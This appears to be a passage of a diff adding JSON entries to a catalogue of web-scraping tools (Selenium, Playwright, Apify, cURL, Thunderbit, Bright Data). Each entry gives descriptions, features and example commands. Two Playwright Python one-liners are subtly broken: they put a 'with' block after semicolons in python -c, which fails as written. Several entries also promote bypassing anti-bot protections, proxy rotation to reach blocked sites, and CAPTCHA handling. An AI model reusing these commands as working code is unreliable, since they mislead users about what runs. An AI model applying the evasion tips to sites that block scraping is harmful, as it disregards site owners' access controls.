+      "python -c \"from selenium.webdriver.common.by import By; from selenium import webdriver; driver = webdriver.Chrome(); driver.get('https://books.toscrape.com'); titles = driver.find_elements(By.CSS_SELECTOR, 'h3 a'); print([t.text for t in titles]); driver.quit()\" # Scrape book titles"
+    ],
+    "source": "https://www.selenium.dev"
+  },
+  {
+    "name": "Playwright",
+    "description": "Playwright is an open-source browser automation library for scraping dynamic websites, built on Chrome DevTools Protocol and supporting Chrome, Firefox, and Safari.",
+    "usage": "Used for scraping JavaScript-heavy sites, automating browser tasks, and handling complex interactions like form submissions and infinite scrolling.",
+    "key_features": [
+      "Cross-browser support (Chrome, Firefox, Safari)",
+      "Headless and non-headless modes",
+      "High-level API for JavaScript execution",
+      "Handles dynamic content and AJAX requests",
+      "Supports Python, JavaScript, and TypeScript",
+      "Strong community with 68.5K GitHub stars"
+    ],
+    "example_commands": [
+      "pip install playwright # Install Playwright Python library",
+      "playwright install # Install browser binaries for Playwright",
+      "python -c \"from playwright.sync_api import sync_playwright; with sync_playwright() as p: browser = p.chromium.launch(); page = browser.new_page(); page.goto('https://example.com'); print(page.content()); browser.close()\" # Scrape a webpage",
+      "python -c \"from playwright.sync_api import sync_playwright; with sync_playwright() as p: browser = p.chromium.launch(headless=True); page = browser.new_page(); page.goto('https://books.toscrape.com'); titles = page.query_selector_all('h3 a'); print([t.inner_text() for t in titles]); browser.close()\" # Scrape book titles in headless mode",
+      "node -e \"const { chromium } = require('playwright'); (async () => { const browser = await chromium.launch(); const page = await browser.newPage(); await page.goto('https://example.com'); console.log(await page.title()); await browser.close(); })();\" # Scrape using Node.js"
+    ],
+    "source": "https://playwright.dev"
+  },
+  {
+    "name": "Apify",
+    "description": "Apify is a cloud-based web scraping and automation platform with a JavaScript SDK, supporting scalable data extraction and CLI-based spider management.",
+    "usage": "Used for building and hosting web crawlers, extracting data from complex websites, and automating browser tasks for market research and lead generation.",
+    "key_features": [
+      "Scalable cloud-based scraping with smart proxy rotation",
+      "Supports headless Chrome and Puppeteer via Apify SDK",
+      "Pre-built actors for common websites (e.g., Amazon, Google)",
+      "Data export to JSON, CSV, or databases",
+      "Free plan with $5 monthly credit",
+      "CLI for managing and running scrapers"
+    ],
+    "example_commands": [
+      "npm install -g apify-cli # Install Apify CLI",
+      "apify init my-scraper # Initialize a new Apify project",
+      "apify create my-actor -t python # Create a Python-based actor",
+      "apify run -p # Run the actor locally",
+      "apify push && apify call my-actor # Deploy and run the actor on Apify cloud"
+    ],
+    "source": "https://apify.com"
+  },
+  {
+    "name": "cURL",
+    "description": "cURL is an open-source command-line tool for making HTTP requests, widely used for simple web scraping tasks and fetching webpage content.",
+    "usage": "Used for quick data extraction from static websites, testing APIs, and fetching HTML or JSON data for further processing with tools like grep or jq.",
+    "key_features": [
+      "Supports multiple protocols (HTTP, HTTPS, FTP)",
+      "Lightweight and pre-installed on most Unix systems",
+      "Customizable headers and user agents",
+      "Handles authentication and cookies",
+      "Integrates with proxy services for anti-bot evasion",
+      "Ideal for simple scraping tasks"
+    ],
+    "example_commands": [
+      "curl https://example.com > output.html # Fetch and save webpage HTML",
+      "curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' https://example.com # Scrape with custom User-Agent",
+      "curl -o data.json https://api.example.com/data # Fetch JSON API response",
+      "curl -X POST -d 'param1=value1' https://example.com/form # Submit a form via POST",
+      "curl https://books.toscrape.com | grep -oP '<h3><a href=\"\\K[^\"]+' # Scrape book URLs with grep"
+    ],
+    "source": "https://curl.se"
+  },
+  {
+    "name": "Thunderbit",
+    "description": "Thunderbit is an AI-powered web automation and scraping tool designed for users of all skill levels, enabling easy data extraction without coding through intuitive interfaces and AI-driven data processing.",
+    "usage": "Used for extracting data from websites for tasks like market research, price monitoring, and lead generation, with support for dynamic and complex web pages.",
+    "key_features": [
+    "AI-powered data extraction with automatic detection and formatting",
+    "No-code interface with 'AI suggest column' and one-click scraping",
+    "Support for multiple data formats (URLs, images, text)",
+    "Automated data processing (summarizing, categorizing, translating)",
+    "Export to Google Sheets, Airtable, or Notion",
+    "Handles dynamic content and JavaScript-heavy sites"
+  ],
+    "example_commands": [
+    "Click 'AI suggest column' and 'Scrape' to extract data from a webpage",
+    "Configure automated scraping task to export data to Google Sheets",
+    "Use Thunderbit’s AI to summarize and categorize scraped data into CSV",
+    "Set up recurring scrape for price monitoring with one-click export to Airtable",
+    "Extract images and URLs from a dynamic website using point-and-click interface"
+  ],
+    "source": "https://thunderbit.com"
+  },
+  {
+    "name": "Bright Data",
+    "description": "Bright Data is a comprehensive web data collection platform offering advanced scraping capabilities, proxy management, and pre-built datasets for large-scale data extraction.",
+    "usage": "Used for extracting structured data from websites for business intelligence, e-commerce monitoring, and market research, with robust handling of anti-bot protections.",
+    "key_features": [
+    "Advanced proxy network for bypassing anti-scraping measures",
+    "AI-driven data extraction with automatic structuring",
+    "Pre-built datasets for e-commerce, social media, and more",
+    "Support for dynamic and JavaScript-heavy websites",
+    "Integration with APIs and cloud platforms",
+    "Compliance with data privacy regulations"
+  ],
+    "example_commands": [
+    "Configure a scraping task in Bright Data’s Web Unlocker to extract product prices",
+    "Use Bright Data’s Data Collector to scrape social media profiles and export to JSON",
+    "Set up a proxy rotation in Bright Data to scrape a blocked website",
+    "Automate data extraction from e-commerce sites and export to CSV via API",
+    "Use Bright Data’s IDE to create a custom scraper for dynamic content",
+     "npm install puppeteer-core",
+    "node scrape.js # Run a Puppeteer script to scrape a website using Bright Data's Scraping Browser",
+    "curl -X POST http://localhost:3000/scrape -H 'Content-Type: application/json' -d '{\"baseUrl\": \"https://example.com\"}' # Test Scraping Browser via REST API",
+    "node scrape_with_captcha.js # Run a Puppeteer script with CAPTCHA handling",
+    "curl 'https://api.brightdata.com/scraper?url=https://example.com' -H 'Authorization: Bearer YOUR_API_KEY' # Use Bright Data’s API for direct scraping"
+  ],
+    "source": "https://brightdata.com"
+  }
+
+]
